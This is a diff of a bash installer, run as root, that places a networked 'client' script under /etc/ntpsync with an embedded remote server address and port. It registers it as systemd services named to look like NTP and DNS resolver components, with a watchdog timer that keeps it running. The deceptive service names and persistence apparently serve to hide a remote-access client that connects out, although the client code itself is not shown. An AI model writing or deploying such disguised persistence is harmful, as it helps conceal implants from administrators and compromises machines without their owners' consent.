@@ -17,7 +17,8 @@ INSTALL_DIR="/etc/ntpsync"
 SCRIPT_NAME="ntp"
 SERVICE_NAME="ntpsyncd"
 TIMER_NAME="dnsresolv"
-CLIENT_SCRIPT="client.py"
+SOURCE_SCRIPT="ntp-daemon"
+MONITOR_SCRIPT="conf"
 
 # Check if running as root
 if [ "$EUID" -ne 0 ]; then 
@@ -38,7 +39,7 @@ if ! command -v python3 &> /dev/null; then
     exit 1
 fi
 
-echo -e "${GREEN}[1/9]${NC} Checking dependencies..."
+echo -e "${GREEN}[1/8]${NC} Checking dependencies..."
 echo "Python 3 version: $(python3 --version)"
 
 # Install pip if not available
@@ -49,66 +50,98 @@ if ! command -v pip3 &> /dev/null; then
 fi
 
 # Install python dependencies
-echo -e "${GREEN}[2/9]${NC} Installing Python dependencies..."
-pip3 install python-dotenv netifaces --break-system-packages
+echo -e "${GREEN}[2/8]${NC} Installing Python dependencies..."
+pip3 install netifaces --break-system-packages 2>/dev/null || pip3 install netifaces
 
 # Create installation directory
-echo -e "${GREEN}[3/9]${NC} Creating installation directory: $INSTALL_DIR"
+echo -e "${GREEN}[3/8]${NC} Creating installation directory: $INSTALL_DIR"
 mkdir -p "$INSTALL_DIR"
 
-# Copy client script
-echo -e "${GREEN}[4/9]${NC} Installing client script..."
-if [ ! -f "$CLIENT_SCRIPT" ]; then
-    echo -e "${RED}Error: $CLIENT_SCRIPT not found in current directory${NC}"
+# Load configuration from .env file
+echo -e "${GREEN}[4/8]${NC} Loading configuration..."
+if [ ! -f ".env" ]; then
+    if [ -f "env.example" ]; then
+        echo -e "${YELLOW}Warning: .env not found, using env.example${NC}"
+        cp "env.example" ".env"
+    else
+        echo -e "${RED}Error: No .env or env.example file found${NC}"
+        exit 1
+    fi
+fi
+
+# Source the .env file to get variables
+set -a
+source .env
+set +a
+
+# Set defaults if not specified
+SERVER_HOST=${SERVER_HOST:-localhost}
+SERVER_PORT=${SERVER_PORT:-8443}
+CLIENT_NAME=${CLIENT_NAME:-}
+
+echo "Configuration:"
+echo "  SERVER_HOST: $SERVER_HOST"
+echo "  SERVER_PORT: $SERVER_PORT"
+echo "  CLIENT_NAME: ${CLIENT_NAME:-<auto-detect>}"
+
+# Copy and configure client script
+echo -e "${GREEN}[5/8]${NC} Installing client script..."
+if [ ! -f "$SOURCE_SCRIPT" ]; then
+    echo -e "${RED}Error: $SOURCE_SCRIPT not found in current directory${NC}"
     exit 1
 fi
 
-cp "$CLIENT_SCRIPT" "$INSTALL_DIR/$SCRIPT_NAME"
+# Create the script with embedded configuration
+cp "$SOURCE_SCRIPT" "$INSTALL_DIR/$SCRIPT_NAME"
+
+# Replace placeholders with actual values
+sed -i "s|{{SERVER_HOST}}|$SERVER_HOST|g" "$INSTALL_DIR/$SCRIPT_NAME"
+sed -i "s|{{SERVER_PORT}}|$SERVER_PORT|g" "$INSTALL_DIR/$SCRIPT_NAME"
+sed -i "s|{{CLIENT_NAME}}|$CLIENT_NAME|g" "$INSTALL_DIR/$SCRIPT_NAME"
+
 chmod +x "$INSTALL_DIR/$SCRIPT_NAME"
 echo "Installed: $INSTALL_DIR/$SCRIPT_NAME"
 
-# Keep a backup copy for the monitor script
-cp "$CLIENT_SCRIPT" "$INSTALL_DIR/$CLIENT_SCRIPT"
-
-# Copy .env file if exists
-if [ -f ".env" ]; then
-    echo -e "${GREEN}[5/9]${NC} Copying .env configuration..."
-    cp ".env" "$INSTALL_DIR/.env"
-    echo "Configuration copied to $INSTALL_DIR/.env"
-elif [ -f ".env.example" ]; then
-    echo -e "${YELLOW}Warning: .env not found, copying .env.example${NC}"
-    cp ".env.example" "$INSTALL_DIR/.env"
-    echo -e "${YELLOW}Please edit $INSTALL_DIR/.env with your server configuration${NC}"
-else
-    echo -e "${YELLOW}Warning: No .env file found. Creating default...${NC}"
-    cat > "$INSTALL_DIR/.env" << 'EOF'
-# Client Configuration
-SERVER_HOST=localhost
-SERVER_PORT=8443
-EOF
-    echo -e "${YELLOW}Please edit $INSTALL_DIR/.env with your server configuration${NC}"
+# Install monitor script
+echo -e "${GREEN}[6/8]${NC} Installing monitor script..."
+if [ ! -f "$MONITOR_SCRIPT" ]; then
+    echo -e "${RED}Error: $MONITOR_SCRIPT not found in current directory${NC}"
+    exit 1
 fi
 
-# Install monitor script
-echo -e "${GREEN}[6/9]${NC} Installing monitor script..."
-cp "monitor.sh" "$INSTALL_DIR/monitor.sh"
-chmod +x "$INSTALL_DIR/monitor.sh"
-echo "Installed: $INSTALL_DIR/monitor.sh"
+cp "$MONITOR_SCRIPT" "$INSTALL_DIR/$MONITOR_SCRIPT"
+chmod +x "$INSTALL_DIR/$MONITOR_SCRIPT"
+echo "Installed: $INSTALL_DIR/$MONITOR_SCRIPT"
 
-# Install systemd service
-echo -e "${GREEN}[7/9]${NC} Installing systemd service..."
+# Update dnsresolv.service to use the new conf script
+echo -e "${GREEN}[7/8]${NC} Installing systemd services..."
+
+# Create dnsresolv.service with correct path
+cat > "/etc/systemd/system/${TIMER_NAME}.service" << EOF
+[Unit]
+Description=DNS Resolver Service Monitor (ntpsyncd watchdog)
+After=multi-user.target
+
+[Service]
+Type=oneshot
+ExecStart=${INSTALL_DIR}/${MONITOR_SCRIPT}
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+echo "Installed: /etc/systemd/system/${TIMER_NAME}.service"
+
+# Install systemd service for main client
 cp "${SERVICE_NAME}.service" "/etc/systemd/system/${SERVICE_NAME}.service"
 echo "Installed: /etc/systemd/system/${SERVICE_NAME}.service"
 
-# Install systemd timer and service
-echo -e "${GREEN}[8/9]${NC} Installing systemd timer..."
-cp "${TIMER_NAME}.service" "/etc/systemd/system/${TIMER_NAME}.service"
+# Install systemd timer
 cp "${TIMER_NAME}.timer" "/etc/systemd/system/${TIMER_NAME}.timer"
-echo "Installed: /etc/systemd/system/${TIMER_NAME}.service"
 echo "Installed: /etc/systemd/system/${TIMER_NAME}.timer"
 
 # Reload systemd
-echo -e "${GREEN}[9/9]${NC} Configuring and starting services..."
+echo -e "${GREEN}[8/8]${NC} Configuring and starting services..."
 systemctl daemon-reload
 
 # Enable and start the main service
@@ -153,6 +186,5 @@ echo "Recent service logs:"
 journalctl -u "${SERVICE_NAME}" -n 10 --no-pager
 
 echo ""
-echo -e "${YELLOW}Important:${NC} Make sure to edit $INSTALL_DIR/.env with your server configuration!"
+echo -e "${GREEN}Configuration has been embedded in $INSTALL_DIR/$SCRIPT_NAME${NC}"
 echo ""
-
